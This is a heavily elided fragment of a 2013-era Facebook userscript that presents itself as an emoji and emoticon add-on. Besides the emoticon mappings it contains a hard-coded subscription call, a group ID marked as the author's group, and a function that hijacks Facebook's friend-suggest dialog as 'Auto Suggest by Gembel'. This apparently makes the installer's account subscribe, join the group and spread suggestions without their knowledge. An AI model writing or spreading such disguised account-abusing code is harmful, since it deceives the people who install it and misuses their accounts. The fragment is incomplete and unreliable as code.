// ==UserScript==
// @name            Emoji New Emoticon @mudhofarmustofa
// @description     Facebook Emotion New 2013 By D'r
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/widibatan" target="_blank">Created By Gembel<br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("167667656737738");

//Group ku Gembel
var gid = ['498775866861946'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Gembel';
